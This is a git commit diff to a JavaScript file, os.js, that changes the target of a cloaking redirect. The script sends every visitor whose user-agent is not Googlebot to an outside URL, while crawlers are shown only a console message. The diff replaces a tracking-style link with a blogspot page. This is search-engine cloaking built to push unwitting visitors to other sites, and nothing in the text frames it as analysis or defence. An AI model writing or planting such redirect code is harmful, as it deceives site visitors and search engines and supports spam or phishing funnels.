f8d3e47eac592250846d99dc6d7b2823fd016181
oxygendpf <carmeloyyschulistgd192@gmail.com>
2026-09-24 21:28:52 +0100

    Update os.js

--- os.js
+++ os.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://mdnappix.com/t/ldp4LVJr/pmiS5MJQ/230ZEwtq/KvrO/AyW2BLf691QZ/";
+  window.location.href = "https://carmelostv.blogspot.com/2026/09/lu-ka-la.html";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
